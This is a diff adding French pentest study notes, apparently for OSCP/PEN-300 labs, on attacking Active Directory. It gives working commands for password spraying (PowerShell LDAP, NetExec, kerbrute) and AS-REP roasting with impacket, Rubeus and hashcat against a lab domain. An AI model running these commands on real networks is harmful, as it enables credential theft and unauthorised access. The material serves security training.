@@ -95,3 +95,98 @@ crypto::cng                        # patcher le service KeyIso
 
 > Activer la **LSA Protection** (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1`) bloque la lecture de LSASS par Mimikatz — bypass couvert dans PEN-300.
 
+## Attaques
+
+### Password Spraying
+
+**Vérifier la politique de verrouillage avant d'attaquer**
+
+```cmd
+net accounts
+```
+
+Champs clés : `Lockout threshold` (tentatives avant blocage) et `Lockout observation window` (minutes avant réinitialisation du compteur).
+
+> Règle : rester sous le seuil de lockout. Ex: seuil = 5 → max 4 tentatives par user. Avec une fenêtre de 30 min, on peut tenter ~192 passwords/24h sans déclencher de lockout.
+
+**Méthode 1 — LDAP/ADSI (PowerShell, low and slow)**
+
+```powershell
+# Tester un mot de passe pour un user via DirectoryEntry
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$DN  = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString = "LDAP://$PDC/$DN"
+New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
+# Si OK → retourne l'objet. Si KO → exception "username or password is incorrect"
+```
+
+```powershell
+# Script automatisé (respecte le lockout)
+.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
+```
+
+**Méthode 2 — SMB avec NetExec (depuis Kali)**
+
+```bash
+nxc smb <IP> -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+```
+
+> `[+]` = credentials valides. `(Pwn3d!)` = l'utilisateur est **admin local** sur la cible.
+>
+> NetExec ne vérifie pas la politique de lockout — à utiliser avec précaution.
+
+**Méthode 3 — Kerberos AS-REQ avec kerbrute (furtif, 2 paquets UDP)**
+
+```powershell
+# Windows
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+```
+
+```bash
+# Linux
+sudo apt update && sudo apt install golang-go --fix-missing
+git clone https://github.com/ropnop/kerbrute.git
+cd kerbrute
+go build -o kerbrute .
+./kerbrute passwordspray -d corp.com ../users.txt 'Nexus123!' --dc 192.168.193.70
+```
+
+> Utilise uniquement AS-REQ/AS-REP — moins de trafic que SMB, pas de connexion complète établie.
+
+### AS-REP Roasting
+
+Si un compte AD a l'option **"Do not require Kerberos preauthentication"** activée, un attaquant peut demander un AS-REP sans s'authentifier → la réponse contient un hash crackable offline.
+
+**Identifier les comptes vulnérables**
+
+```powershell
+# Windows (PowerView)
+Get-DomainUser -PreauthNotRequired
+```
+
+```bash
+# Kali — sans -request pour juste lister les users vulnérables
+impacket-GetNPUsers -dc-ip <IP_DC> corp.com/pete
+```
+
+**Récupérer les hashes AS-REP**
+
+```bash
+# Kali
+impacket-GetNPUsers -dc-ip <IP_DC> -request -outputfile hashes.asreproast corp.com/pete
+```
+
+```powershell
+# Windows (Rubeus)
+.\Rubeus.exe asreproast /nowrap
+```
+
+**Cracker le hash (mode 18200)**
+
+```bash
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+> **Targeted AS-REP Roasting** : si on a `GenericWrite` ou `GenericAll` sur un compte, on peut modifier son `UserAccountControl` pour désactiver la pré-authentification, récupérer le hash, puis remettre la valeur d'origine. En pratique, **Targeted Kerberoasting** est préféré pour le même prérequis — il suffit d'ajouter un SPN sans toucher au `userAccountControl`.
+
